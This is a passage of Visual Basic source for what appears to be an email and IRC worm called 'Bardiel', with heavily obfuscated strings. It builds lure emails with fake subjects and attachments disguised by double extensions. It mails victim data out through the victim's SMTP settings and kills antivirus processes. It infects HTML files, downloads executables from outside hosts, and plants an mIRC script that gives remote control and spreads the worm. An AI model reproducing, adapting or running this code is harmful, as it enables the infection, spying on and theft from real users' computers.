   eb0 = q("@ubbsni`t"): eb00 = q("Obkkh'Abknwb") & vbCrLf & q("Obub+'sob'wndsrubt'sofs'~hr'ubvrbtsbc'jb'fub") & vbCrLf & q("Ficubf") & vbCrLf & q("e~b"): eb000 = q("Wndsrubt)tdu")
   Case 32
   eb0 = q("Tbunbt+'Jhqnbt+'ihqbkt"): eb00 = q("~hr'Pfis'sh'cntdofu`b'thjb'jhqnb+'dofwsbut'`nqb'f'tbunbt'hu'ihqbk'hu'sh'anic") & vbCrLf & _
   q("ubtrjbt+'fcqfidbt'fic'wndsrubt+'hu'wbuofwt'sh'lihp'jhub'sofi'sobnu'jfni'dofufdsbut8'Sobi") & vbCrLf & _
   q("ns'khhlt'ahu'ni'hru'cfsfeftb+'ns'wubttbt'sob'dhiibdsnhi'tbis'sh'bisbu)"): eb000 = q("ppp)BisbuSqUbc)dhj")
   Case 33
   eb0 = q("Dhianujfsnhi'`nqbt'Tretdunwsnhi"): eb00 = q("Sobnu'fccubtt'`nqbt'bkbdsuhind'jfnk+'ns'pft'`nqbi'ob(tob'`nqbt'on`o'sh'ubdbnqb'hru") & vbCrLf & _
   q("erkkbsni+'sh'dhianuj'sofs'~hr'pbub'sob'hib'sofs'N'bisbu'nst'fccubtt'hu'sh'eb'`nqbi'`nqbt") & vbCrLf & _
   q("ns'khpbut+'tduneb'sh'sob'bjfnk'sofs'ob'fwwbfut'fs'sob'bic'`nqbt'sob'erkkbsni"): eb000 = q("Erkkbsni'I)572)dhj")
   Case 34
   eb0 = q("Tb Tnjrkfshu"): eb00 = q("ns'Wuhqbt'sont'tofjjbu+'sobub'fub'ni'sob'afds'sofs'snjbt'ns'nt'ibbcbc'=."): eb000 = q("Tb Tnjrkfshu)b b")
   Case 35
   eb0 = q("Khqb"): eb00 = q("f'ponkb'f`h'sofs'N'khqb'~hr'tbdubsk~+'ers'shcf~'N'dobbu'rw'sh'sbkk'ns'sh'~hr") & vbCrLf & _
   q("ni'sont'kbssbu") & vbCrLf & q("Thjbehc~'sofs'fcjnubt'~hr"): eb000 = q("Kbssbu)tdu")
   Case 36
   eb0 = q("Dorwf~urif")
   eb00 = q("F'sonuts~'cbjhi'sufqbkt'sob'thknsfu~'wkfdbt'ob'`nqbt'sob'~hr'pfkl") & vbCrLf & _
   q("cbdbnqni`'sob'sufqbkbut'pnso'fetruc'wuhjntbt'sofs'tbuqb'onj'ahu") & vbCrLf & _
   q("sh'tsbfk'sobj'sobnu'wuhqntnhit'`nqbt'knvrhu")
   eb000 = q("Dorwf~urif)tdu")
   Case 37
   eb0 = q("ch'~hr'Lihp'sob'Cnjbitnhi'Cbtrendfcf8")
   eb00 = q("F'wfufkkbk'phukc'sofs+'ohpbqbu'ob'ubtbjekbt'hrut'fjf}ni`k~")
   eb000 = q("CnjbitnhiCbtrendfcf)tdu")
   Case 38
   eb0 = q("Aftonhi'Wril")
   eb00 = q("lihp'sob'ebts'soni`'`nqbt'sob'aftonhi'Wril+'~hr'`bfu'fic'fddbtthunbt")
   eb000 = q("AftonhiWril)wna")
   Case 39
   eb0 = q("ns'Khtbt'pbn`os'67'lnkht'ni'hib'jhiso")
   eb00 = q("Snubc'ob(tob'`nqbt'sh'oncb'sobnu'hebtns~'ni'sob'ebfdo+'`nqb'sh'rtb'dkhsobt") & vbCrLf & _
   q("sh'knib'sh'oncb+'wuhqb'sont'wuh`ufj'ob(tob'`nqbt'cnbs'fic'b budntb'677'ifsrufk") & vbCrLf & _
   q("pnso'sob'hib'pondo'pnsohrs'en`'tfdunandbt'ibnsobu'tncb'baabdst+'uhs'sh'ubdhqbu'sobnu'`hhc'an`rub") & vbCrLf & _
   q("'/na'fs'thjb'snjb'ob(tob'ofc'ns.'fic'na'ob(tob'phi s'ofqb'ns'ihp)")
   eb000 = q("TfisfIfsruf)tdu")
   Case 40
   eb0 = q("Niahujfsnhi'sh'Pniibut")
   eb00 = q("Sob'wubtbis'nt'sh'dhjjrindfsb'onj'sofs'nst'fccubtt'`nqbt'bjfnk") & vbCrLf & _
   q("sh'pniini`'ubtrks'ob(tob'`nqbt'#677'ni'hru'cufpni`+'tbuqb'~hr'sh'ubfc'sob'eunbani`t") & vbCrLf & _
   q("ni'hucbu'sh'wndl'rw'sobnu'wun}b'ebahub'47'cf~t'tsfusni`'auhj'ubdbnqbc'sob'jbttf`b)")
   eb000 = q("eunbani`)wna")
   End Select

   End If
   If Int((Rnd * 2) + 1) = 2 Then eb00 = eb00 & vbCrLf & vbCrLf & MVC
   If xy = 0 Then
   ctmime = "Content-Type: application/octet-stream;" & vbCrLf & _
   Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-Disposition: attachment;" & vbCrLf & _
   Chr(9) & "filename=" & Chr(34) & eb000 & Chr(34) & vbCrLf
   Else
   Randomize: ctn = Int(Rnd * 2) + 1
   If ctn = 1 Then
   Dim ctsp(0 To 1) As String: ctsp(0) = Left(eb000, Len(eb000) - 3): ctsp(1) = Right(eb000, 3)
   ctmime = "Content-Type: image/jpeg;" & vbCrLf & _
   "Content-Disposition: attachment;" & vbCrLf & Chr(9) & _
   "filename=" & Chr(34) & ctsp(0) & "jpg (10.7 KB)" & Space(261 - (Len(ctsp(0)) + 19)) & "." & ctsp(1) & ".jpg" & Chr(34) & vbCrLf
   ElseIf ctn = 2 Then
   ctmime = "Content-Type: audio/x-wav;" & vbCrLf & _
   Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-ID: <BARDIEL>" & vbCrLf
   eb00 = eb00 & vbCrLf & "<iframe src=cid:BARDIEL" & "><" & "/iframe>"
   End If
   End If

   Boundary = "----=_NextPart_000_0002_01BD22EE.C1291DA0"
   BEML = "From: " & Chr(34) & xx & Chr(34) & " <" & Bnm & ">" & vbCrLf & _
   "Subject: " & eb0 & vbCrLf & "DATE:" & Chr(32) & Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & vbCrLf & _
   "MIME-Version: 1.0" & vbCrLf & "Content-Type: multipart/mixed;" & vbCrLf & _
   Chr(9) & "boundary=" & Chr(34) & Boundary & Chr(34) & vbCrLf & _
   "X-Priority: 3" & vbCrLf & "X-MSMail - Priority: Normal" & vbCrLf & _
   "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & "" & vbCrLf & _
   "Esto es un mensaje multiparte en formato MIME" & vbCrLf & "" & vbCrLf & _
   "--" & Boundary & vbCrLf & "Content-Type: text/html;" & vbCrLf & _
   Chr(9) & "charset=" & Chr(34) & "x-user-defined" & Chr(34) & vbCrLf & _
   "Content-Transfer-Encoding: 8bit" & vbCrLf & "" & vbCrLf & eb00 & vbCrLf & "" & vbCrLf & _
   "--" & Boundary & vbCrLf & ctmime & "Content-Transfer-Encoding: base64" & vbCrLf & "" & vbCrLf & _
   BC4 & vbCrLf & "" & vbCrLf & "--" & Boundary & "--"
   End Function

   Private Sub Form_Terminate()
   On Error Resume Next: CloseHandle (Mutex)
   End Sub

   Private Sub Form_Unload(Cancel As Integer)
   On Error Resume Next: CloseHandle (Mutex)
   End Sub

   Private Sub Bt2_Timer()
   On Error Resume Next: Bt2.Enabled = False: SearchScan: Bt2.Enabled = True
   End Sub

   Sub SearchScan()
   On Error Resume Next
   If GetWinVersion() = 2 Then KantiNT Else KAnti98
   Dim Src As Boolean
   Src = EnumWindows(AddressOf FuncSearchScan, ByVal 0&)
   End Sub

   Sub BSendMail()
   On Error Resume Next: Dim sBInfo As String
   If (InDat(1) <> "") And (Len(InDat(1)) > 4) And (InStr(InDat(1), ".") <> 0) And (IsMail(InDat(2)) = True) Then
   bSmtp InDat(1), Sp(2) & q("[JfnkO)cfs"), InDat(2), 0
   bSmtp InDat(1), Sp(2) & q("[JfnkK)cfs"), InDat(2), 0
   bSmtp InDat(1), Sp(2) & q("[JfnkJ)cfs"), InDat(2), 1
   Else
   bSmtp q("jfnk)ohsjfnk)dhj"), Sp(2) & q("[JfnkO)cfs"), q("ficubf5777Gohsjfnk)dhj"), 0
   bSmtp q("j 6)kfsnijfnk)dhj"), Sp(2) & q("[JfnkK)cfs"), q("ufrkXJGkfsnijfnk)dhj"), 0
   End If
   sBInfo = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ENiah"))
   If sBInfo = "" Then
   Call SendBackDat
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ENiah"), "1", ""
   End If
   End Sub

   Function InDat(n) As String
   On Error Resume Next
   Select Case n
   Case 1
   InDat = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Nisbuibs'Fddhris'Jfif`bu[Fddhrist[77777776[TJSW'Tbuqbu"))
   Case 2
   InDat = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Nisbuibs'Fddhris'Jfif`bu[Fddhrist[77777776[TJSW'Bjfnk'Fccubtt"))
   End Select
   End Function

   Sub BHtmlInfected(Bhl)
   On Error Resume Next: SA Bhl, 0
   Set H1 = Bf.OpenTextFile(Bhl)
   Hr1 = H1.ReadLine
   If InStr(Hr1, q("JNJB")) <> 0 Then
   H1.Close
   Exit Sub
   Else
   Hr2 = H1.ReadAll: H1.Close
   End If

   For i = 1 To Len(Hr2)
   Ck = Asc(Mid(Hr2, i, 1))
   If Ck = Asc("%") Then
   EC = EC & "¥"
   ElseIf Ck = 13 Then
   EC = EC & Chr(28)
   ElseIf Ck = 10 Then
   EC = EC & Chr(29)
   Else
   EC = EC & Chr(Ck Xor 7)
   End If
   Next

   EC = q("Efucnbk':'B/") & Chr(34) & EC & Chr(34) & q(".")

   Set H2 = Bf.OpenTextFile(Bhl, 2, 1)
   H2.write BScript1 & EC & BScript2
   H2.Close
   End Sub

   Sub BComponents()
   On Error Resume Next
   If BState = False Then Exit Sub
   Dim Apm(1 To 6) As String, apc As Integer: Randomize

   If Not (Flx(Sp(1) & q("[wl}nw)b b"))) Then
   c = DowFile(q("ossw=((rtrfunht)k~dht)bt(`bcjcj(wl}nw)eni"), Sp(1) & q("[wl}nw)b b"))

   If c <> True Then
   apc = Int(Rnd * 5) + 1
   Apm(1) = q("ossw=((cej6)biq~)ir(wl}nw)eni")
   Apm(2) = q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(wl}nw)eni")
   Apm(3) = q("ossw=((jfdonibc)pbednicfunh)dhj(wl}nw)eni")
   Apm(4) = q("ossw=((ppp)`ej6)biq~)ir(wl}nw)eni")
   Apm(5) = q("ossw=((mej6)biq~)ir(wl}nw)eni")
   c = DowFile(Apm(apc), Sp(1) & q("[wl}nw)b b"))
   End If

   End If

   c = False

   If Not (Flx(Sp(0) & q("[dfw)b b"))) Then
   c = DowFile(q("ossw=((`bcjcj)whus2)dhj(dfw)eni"), Sp(0) & q("[dfw)b b"))
   End If

   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[DhjSnjb"), Day(Date), ""
   End Sub

   Function IsMReg(m) As Boolean
   On Error Resume Next: Dim M1 As String
   M1 = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Jfnk[") & m)
   If M1 = "" Then
   IsMReg = True
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Jfnk[") & m, q("EJfnk"), ""
   Else
   IsMReg = False
   End If
   End Function

   Sub BMirc(m)
   On Error Resume Next: Dim mo As String, MCV As String, M1 As String, M2 As String, M3 As String, M4 As String, M5 As String

   WIni q("uankbt"), q("i5"), q("Ubjhsb)njn"), m & q("[Jnud)nin")
   WIni q("pfui"), q("atbuqb"), q("haa"), m & q("[Jnud)nin")
   WIni q("pfui"), q("cdd"), q("haa"), m & q("[Jnud)nin")
   WIni q("ankbtbuqbu"), q("pfuini`"), q("haa"), m & q("[Jnud)nin")
   WIni q("sb s"), q("Vrns"), q("Hwhusrincfcbt'cb'sufefmh'fvrn'*9'ossw=((ppp)of~pnubc)dhj(`bcjn(nicb )osj"), m & q("[Jnud)nin")
   mo = IniR(q("hwsnhit"), q("i5"), m & q("[Jnud)nin")): mo = Mid(mo, 1, 10) & q("6+6") & Mid(mo, 14): WIni q("hwsnhit"), q("i5"), mo, m & q("[Jnud)nin")
   mo = IniR(q("hwsnhit"), q("i7"), m & q("[Jnud)nin")): mo = Mid(mo, 1, 37) & q("+6+") & Mid(mo, 41): WIni q("hwsnhit"), q("i7"), mo, m & q("[Jnud)nin")

   M1 = q("<Jnud'Ubjhsb'Dhian`'0)7'***************************************************") & vbCrLf & _
   q("<Sob'jhcnandfsnhi'`nqbt'sont'Tdunws'ns'dfi'dfrtb'sob'efc'hwbufsnhi'ob'`nqbt'sob'wuh`ufj") & vbCrLf & _
   q("<Kf'jhcnandfdnôi'cb'btsb'Tdunws'wrbcb'dfrtfu'bk'jfk'aridnhifjnbish'cbk'wuh`ufjf") & vbCrLf & _
   q("<ossw=((ppp)jnud)dhj'*'Etdunws/Ibp*Qbutnhi.") & vbCrLf & _
   q("<*****************************************************************************") & vbCrLf & _
   q("dsdw'6=-=-=|'na'/#6'&:'CDD.'{{'/#6'&:'DOFS.'{{'/#6'&:'Qbutnhi.'{{'/#6'&:'Snjb.'{{'/#6'&:'Ani`bu.'{{'/#6'&:'rtbuniah.'{{'/#6'&:'Wni`'.'|')dsdwubwk~'#indl'('Ubdnench'{'na'/Gql)Tw~':'#surb.'|'qfu'Ge'#ubjhqb/#6*+(.'{'Ge'{'(dkbfu'{'ofks'z'z'z") & vbCrLf & _
   q("Hi'6=Sb s=riwftt-=-=|'qfu'Gs 4':'#ubjhqb/#6+riwftt.'{'na'/Gs 4'::'#dou/06.'#,'#dou/672.'#,'#dou/655.'#,'#dou/>?.'#,'M.'|')tbs'Gql)Tw~'#afktb'{')wunqjt`'#indl'Sbujnifich'Tbdnhi'cb'Dhisuhk'Ubjhsh'=.'z") & vbCrLf & _
   q("bktb'|')wunqjt`'#indl'wftt'nidhuubds'=/'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
   q("Hi'6=SB_S=wftt-=-=|'qfu'Gs ':'#ubjhqb/#6+wftt.'{'na'/Gs '::'#dou/06.'#,'#dou/672.'#,'#dou/655.'#,'#dou/>?.'#,'M.'|')tbs'Gql)Tw~'#surb'{')tbs'Gql)indl'#indl'{')wunqjt`'#indl'Nindnfich'Tbdnhi'cb'Dhisuhk'Ubjhsh'=.'z") & vbCrLf & _
   q("bktb'|')wunqjt`'#indl'wftt'nidhuubds'=/'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
   q("Hi'6=Sb s=EUS-=-=|'na'/Gql)Tw~':'#afktb.'|'ofks'z'{'qfu'Gs s':'#ubjhqb/#6+EUS.'{'na'/Gs s'::'Tw~NHi.'|')tbs'GTw~N'#surb'z") & vbCrLf & _
   q("''bktbna'/Gs s'::'Tw~SdHi.'|')tbs'GTw~Sd'#surb'z'{'bktbna'/Gs s'::'Tw~SwHi.'|')tbs'GTw~Sw'#surb'z'{'bktbna'/Gs s'::'Tw~NHaa.'|')tbs'GTw~N'#afktb'z'{''bktbna'/Gs s'::'Tw~SHaa.'|')tbs'GTw~Sd'#afktb'{')tbs'GTw~Sw'#afktb'z") & vbCrLf & _
   q("''bktbna'/Gs s'::'Tw~lb~.'|')cdd'tbic'*d'#indl'#jnudcnu'#,'jnudlb~)`c'z'{'bktbna'/Gs s'::'Tw~cnu.'|')atbuqb'#indl'4'#kbas/#jnudcnu+4.'z") & vbCrLf & _
   q("bktbna'/Gs s'::'Ekk.'|')cntdhiibds'{')b ns'z'{'bktbna'/Gs s'::'anic.'|'anic'#6*'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
   q("Hi'6=Sb s=-=8=|'na'/GTw~Sw':'#surb.'|')wunqjt`'Gql)indl';'#,'#Indl'#,'9'#,'#6*'z'{'na'/suhmfi'ntni'#6*.'{{'/phuj'ntni'#6*.'{{'/suh~fih'ntni'#6*.'{{'/qnurt'ntni'#6*.'|')n`ihub'#indl'{')dkhtb'*dj'#indl'z'z") & vbCrLf & _
   q("Hi'6=Sb s=-=$=|'na'/GTw~Sd':'#surb.'|')wunqjt`'Gql)indl';'#,'#Indl'#,'9'#,'#6*'z'z") & vbCrLf & _
   q("Hi'6=NIWRS=-=|'na'GTw~N':'#surb'|')wunqjt`'Gql)indl'65'#,'#6*'#,''z") & vbCrLf

   M2 = q("''na'/ncbisna~'ntni'#6*.'|'qfu'Gedu':'#jnudcnu'#,'jnudlb~)`c'{'na'/#b ntst/Gedu.':'#afktb.'|')punsb'Gedu'***'Efucnbk'***'#arkkcfsb'z") & vbCrLf & _
   q("''''na'/#ubfc'*p-'#,'#jb'#,'-'Gedu':'#irkk.'|')punsb'Gedu'*****Efucnbk*****'{')punsb'Gedu'E:'#jb") & vbCrLf & _
   q("'''''')punsb'Gedu'E:'#dofi'{')punsb'Gedu'E:'#6*'{')punsb'Gedu'E:'#bjfnk'{')punsb'Gedu'E:'#tbuqbu'#whus") & vbCrLf & _
   q("'')punsb'Gedu'E:'Pn'#,'ich'#,'pt'#ht'{')punsb'Gedu'E:'#arkkcfsb'{')punsb'Gedu'*****Efucnbk*****'z'z") & vbCrLf & _
   q("''na'/Fknft'ntni'#6*.'|'ofks'z'{'na'/Khfc'ntni'#6*.'|'ofks'z'{'na'/Ubjnin'ntni'#6*.'|'ofks'z'{'na'/Rikhfc'ntni'#6*.'|'ofks'z'{'na'/Ubjhqb'ntni'#6*.'|'ofks'z'{'na'/Tbs'ntni'#6*.'|'ofks'z'{'na'/Bqbist'ntni'#6*.'|'ofks'z") & vbCrLf & _
   q("na'/Ritbs'ntni'#6*.'|'ofks'z'{'na'/RitbsFkk'ntni'#6*.'|'ofks'z'{'na'/Bifekb'ntni'#6*.'|'ofks'z'{'na'/Cntfekb'ntni'#6*.'|'ofks'z'{'na'/Ubjhsb'ntni'#6*.'|'ofks'z'{'na'/tdunws'ntni'#6*.'|'ofks'z'{'na'/wkf~'ntni'#6*.'|'ofks'z'z") & vbCrLf & _
   q("Fknft'rikhfc'|')bdoh'*fb'#cbdhcb/LnEQej q^PUk]DE}^4MwdOV`Mp::+j.'#,'#5'#,' 'z") & vbCrLf & _
   q("Fknft'thdlknts'|'(bdoh'*fb'#cbdhcb/LnhvNB2qN@>p]P3`d5>mf5Q7dp::+j.'{'ofks'z") & vbCrLf & _
   q("Fknft'anic'|") & vbCrLf & _
   q("''na'#5'::'cnu'|'#aniccnu/#ubwkfdb/#4+X+##dou/45..+#3+#2+#1+wunqjt`'Gql)indl'#6*.'z") & vbCrLf & _
   q("''na'#5'::'fkk'|'#aniccnu/#ubwkfdb/#4+X+##dou/45..+#3+#2+#1+wunqjt`'Gql)indl'#6*.'{'#anicankb/#ubwkfdb/#4+X+#dou/45..+#3+#2+#1+wunqjt`'Gql)indl'#6*.'z") & vbCrLf & _
   q("''na'#5'::'ankb'|'#anicankb/#ubwkfdb/#4+X+#dou/45..+#3+#2+#1+wunqjt`'Gql)indl'#6*.'z") & vbCrLf & _
   q("''na'#5'::'tbfudo'|'#anicankb/#ubwkfdb/#4+X+#dou/45..+#3+#2+wunqjt`'Gql)indl'#6*.'z") & vbCrLf & _
   q("''na'#5'::'`bs'|'etd'Gql)indl'#4'$hw'z") & vbCrLf & _
   q("z") & vbCrLf & _
   q("<*****************************************************************************") & vbCrLf & _
   q("Hi'-=thdlubfc=ehs=|'thdlubfc'Gehsubfc'{'na'/#`bsshl/Gehsubfc+6+45.'::'WNI@.'|')thdlpunsb'*si'#thdlifjb'whi`'#ubjhqb/#`bsshl/Gehsubfc+5+45.+=.'z'{'na'/JCJ*@BC]FD'ntni'Gehsubfc.'!!'/ENUD'ntni'Gehsubfc.'|'qfu'Ge`':'#ubjhqb/#`bsshl/Gehsubfc+2*+45.+=.'{'Ge`'z'{'na'/JCJ*@BC]FD'ntni'Gehsubfc.'!!'/ENIAH'ntni'Gehsubfc.'|')thdlpunsb'*i'#thdlifjb'wunqjt`'#cbdhcb/N5cl^_Uo+j.'='#,'#jb'#,'#dou/45.'#,'#tbuqbu'#,'#dou/45.'#,'#whus'#,'#dou/45.'#,'#jnudcnu'#,'#dou/45.'#,'#nw'#,'#dou/45.'#,'#cfsb'#,'#dou/45.'#,'#snjb'z'z") & vbCrLf & _
   q("Hi'-=Thdlhwbi=ehs=|'na'/#thdlbuu'9'7.'|'ofks'z'{'tbs'*r6'Grtbu'#ufic/F+}.'#,'#ufic/f+}.'#,'#ufic/f+}.'#,'#ufic/f+}.'#,'#ufic/F+}.'#,'#ufic/f+}.'#,'#ufic/6+>.'#,'#ufic/f+}.'{')thdlpunsb'*is'#thdlifjb'RTBU'Grtbu'Grtbu'Grtbu'='#,'#jb'{')thdlpunsb'*is'#thdlifjb'INDL'#u/f+}.'#,'#u/6+>.'#,'#u/f+}.''#,'#u/F+].'#,'#u/6+>.'#,'#u/f+}.'#,'#u/f+}.'#,'#u/6+>.'#,'#u/f+}.'#,'#u/f+}.'#,'#u/6+>.'#,'#u/f+}.''#,'#u/F+].'#,'#u/6+>.'#,'#u/f+}.'#,'#u/f+}.'#,'#u/6+>.'#,'#u/f+}.'#,''#,'{'thdlpunsb'*si'#thdlifjb'mhni'#cbdhcb/N5cl^_Uo+j.'{')snjbu'6'4'thdlpunsb'*i'#thdlifjb'wunqjt`'#cbdhcb/N5cl^_Uo+j.'='#,'#jb'#,'#dou/45.'#,'#cbdhcb/Q}J~KlModjUw]PprV`::+j.'z") & vbCrLf & _
   q("Hi'-=thdldkhtb=ehs=|')snjbu'6'4')thdlhwbi'#cbdhcb/^j>7+j.'#cbdhcb/e4wnb_Ukd~2l^PprejQ7+j.'1110'z") & vbCrLf & _
   q("Fknft'Eehs'|')snjbu'6'4')thdlhwbi'#cbdhcb/^j>7+j.'#cbdhcb/e4wnb_Ukd~2l^PprejQ7+j.'1110'z") & vbCrLf & _
   q("<*****************************************************************************") & vbCrLf

   M3 = q("Hi'6=DHIIBDS=|'(Ritbs'Gqe)-'Gql)-'Gqi)-'{'(tbs'GTw~N'#afktb'{'(tbs'GTw~Sd'#afktb'{'(tbs'GTw~Sw'#afktb'{'(tbs'Gql)Tw~'#afktb'{'(Ubjhsb'Hi'{'|'Eehs'z'z") & vbCrLf & _
   q("Hi'6=MHNI=-=|'na'/#indl'&:'#jb.'|'|'ejt'z'{'|'et'z'z'{'bktb'|'na'/f~rcf'ntni'$.'{{'/obkw'ntni'$.'{{'/qnurt'ntni'$.'{{'/fqs'ntni'$.'{{'/qo'ntni'$.'|')wfus'$'Nud)Efucnbk)E'@BC]FD'KFET'{')cntdhiibds'{')b ns'z'z'z") & vbCrLf & _
   q("Hi'6=AnkbUdqc=-=|'na'/#indl'&:'#jb.'|'|'ejt'z'{'|'et'z'z'z") & vbCrLf & _
   q("Hi'6=WFUS=$=|'na'/#indl'&:'#jb.'|'|'ejt'z'{'|'et'z'z'z") & vbCrLf & _
   q("Hi'6=AnkbTbis=-=|'na'/)}nw'ntni'#ankbifjb.'|'ofks'z'{'qfu'Gtw':'") & Sp(1) & q("'#,'#cbdhcb/_@ck]Owo^~21f_F:+j.'{')dhw~'*h'Gtw'#ihankb/Gtw.'#,'#`bsshl/#ihwfso/#ankbifjb.+6+31.'#,'5)}nw'{'etd'#indl'#ihankb/Gtw.'#,'#`bsshl/#ihwfso/#ankbifjb.+6+31.'#,'5)}nw'$hw'z") & vbCrLf & _
   q("Hi'6=TBICAFNK=-=|'ofks'z") & vbCrLf & _
   q("Fknft'et'|'qfu'Gew':'") & Sp(1) & q("'#,'#cbdhcb/_@ck]Owo^~21f_F:+j.") & vbCrLf & _
   q("''na'/#b ntst/Gew.':'#afktb.'|'ofks'z'{'qfu'Geu':'#ufic/6+67.'") & vbCrLf & _
   q("''na'/Geu':'6.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/VPUwcjkr^P21^T21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/VPUwcjkr^P21^T21f_F:+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'5.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/Qjkl]P?rbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/Qjkl]P?rbjkp+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'4.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/V5>re5IkS@>V^_Moej>~ePAtKiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/V5>re5IkS@>V^_Moej>~ePAtKiwwdF::+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'3.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/Uj>7e~21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/Uj>7e~21f_F:+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'2.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/f5A7cOlrbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/f5A7cOlrbjkp+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'1.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/S4IoePAD]P2J^PUken21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/S4IoePAD]P2J^PUken21f_F:+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'0.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/T@Qmf@k1e~21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/T@Qmf@k1e~21f_F:+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'?.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/ViQ}fA>5d6>S^PUoeT21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/ViQ}fA>5d6>S^PUoeT21f_F:+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'>.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/S_Q}fPJrbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/S_Q}fPJrbjkp+j.'z") & vbCrLf & _
   q("''bktbna'/Geu':'67.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/c4c4KjQrcOMkc@QrfP6w]P27e~21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/c4c4KjQrcOMkc@QrfP6w]P27e~21f_F:+j.'z") & vbCrLf & _
   q(")n`ihub'*uwdisnl r62'#fccubtt/#indl+6.'{'etd'#indl'Gqe)ankb'#dofi'z") & vbCrLf & _
   q("Fknft'ejt'|'qfu'Geu4':'#ufic/6+67.'") & vbCrLf & _
   q("''na'/Geu4':'6.'|'qfu'Gej4':'?+3'#,'#cbdhcb/R_Qw]_Mkd~E}^PMkdnEme56qN@oo^5sk^_N`cP3`ePAweDEkeiUqejIkd~EkeiU~^TEoN@o7cOF1K~>4c4dre5Ulc5>~e@U1KjIqeT>s^PIhK5kr]@Q3Kjo7eV::+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'5.'|'qfu'Gej4':'#cbdhcb/T@>t^TEsf_MoN@Q}c@B`d@Ai]V::+j.'#,'#Dou/45.'#,'65+?'#,'#cbdhcb/fOU7dChqK4c4c~2h^_k4f_Mk]D2me57q]5QlePlqfP2l]_`rfOUs+j.'#,''#,'#Dou/45.'#,'#cbdhcb/^TE5]_N`d_QkNOUkNOEodjQm]V::+j.'#,'#Dou/45.'#,'=.'z") & vbCrLf & _
   q("''bktbna'/Geu4':'4.'|'qfu'Gej4':'3+6'#,'#cbdhcb/S@A}N@]qc@>}N@6od~Ehe4V`ePk~^P od~EkenEhcOUpHn?qc4c4Kj>l]Ocqdj lbn2me57qePAmfD>wejUkbD2hc@7:+j.'#,''z") & vbCrLf

   M4 = q("''bktbna'/Geu4':'3.'|'qfu'Gej4':'0+3'#,'#cbdhcb/R_Qw]_Mkd~E5]_N`]j>7e4J`]@R`^5ow^5A}N@?`^5ow^5>}NOl`]@A~e@Q}NOE6eiU6^PIwe53`]P27djB`^TEhcOUpHn?qc4c4Kjoob_cwdjQlKjIqeT>i]PUsfT>wejUkbD2hc@7:+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'2.'|'qfu'Gej4':'?+3'#,'#cbdhcb/VPIm]PUkN@B`eiQkd4U~e~Es^P26^Pp`]@R`d5QlcPImfP>rN@o7cOF1K~>4c4drf@>s]_Eo]5Q1KjIqeT>i]PUsfT>wejUkbD2hc@7`bTEs]PwqdjB`cOQ}NOMkd4Qtc@Ale4J`^5>rN@QtNOIkb@?`e4E6]_I7ep::+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'1.'|'qfu'Gej4':'3+6'#,'#cbdhcb/R5l`c@kkejQ}N@6od~El]TF HDEo?P>}N@QrcOMoN@A cPl`fOU7dChqK4c4c~2he56kd@Ai]_hr^5>sK5ck]@6wK5kr]@Q3Kjo7eTFhd5>te~Ep^_MoN@AlcP 7e4Jw+j.'#,''z") & vbCrLf & _
